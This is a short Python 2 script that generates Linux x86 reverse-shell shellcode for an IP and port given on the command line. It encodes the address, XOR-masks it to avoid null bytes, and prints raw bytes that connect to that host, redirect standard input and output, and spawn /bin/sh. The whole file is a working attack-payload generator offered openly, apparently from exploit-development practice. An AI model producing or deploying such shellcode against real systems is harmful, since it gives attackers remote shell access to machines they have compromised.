#!/usr/bin/env python2
from sys import argv

ip = argv[1]
port = int(argv[2])
hexport = hex(int(port)).replace('0x', '')

if len(hexport) < 4:
   hexport = '0' + hexport

hexport = '\\x%s\\x%s' % (hexport[0:2], hexport[2:])
arr = ip.split('.')

nullbyte = False
for i in xrange(0, len(arr)):
    arr[i] = int(arr[i]) 
    if arr[i] == 0:
	nullbyte = True

if nullbyte:
    for i in xrange(0, len(arr)):
	arr[i] = arr[i]^0xFF
for i in xrange(0, len(arr)):
    t ='\\x'
    t += '%02x' % int(arr[i])
    arr[i] =  t

arr = ''.join(arr)

sc = "\\x31\\xc0\\x31\\xdb\\x50\\x40\\x50\\x40\\x50\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2"
if nullbyte:
    # mov edi, 0xFFFFFFFF
    sc += "\\xbf\\xff\\xff\\xff\\xff"
    # xor edi, 0x95FF573F
    sc += "\\x81\\xf7" + arr
else:
    sc += "\\xbf" + arr
# push edi, pushw
sc += "\\x57\\x66\\x68"
# port nr
sc += hexport
#"\x11\x5c"
sc += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xb0\\x66\\x43\\xcd\\x80\\x31\\xc9" 
sc += "\\xb1\\x02\\x89\\xd3\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xff\\x57\\xb0\\x0b\\x68\\x2f"
sc += "\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x57\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80"

print 'IP: %s' % ip
print 'IPHex: %s' % arr
print 'Port: %d' % port
print 'Hexport: %s\nShellcode:\n' % hexport
print sc

